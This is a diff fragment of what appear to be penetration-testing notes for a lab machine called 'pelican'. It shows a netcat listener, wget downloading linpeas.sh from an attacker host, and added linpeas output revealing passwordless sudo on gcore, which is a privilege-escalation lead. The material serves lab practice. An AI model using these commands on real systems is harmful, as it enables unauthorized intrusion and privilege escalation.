@@ -65,6 +65,18 @@ nc -nvlp 8888
 # linpeas
 python3 -m http.server 80
 wget http://kali/linpeas.sh
+./linpeas.sh
+
+╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                             
+Matching Defaults entries for charles on pelican:                                                                                                           
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User charles may run the following commands on pelican:
+    (ALL) NOPASSWD: /usr/bin/gcore
+Sudoers file: /etc/sudoers.d/charles is readable
+charles ALL=(ALL) NOPASSWD:/usr/bin/gcore
+
 
 
 
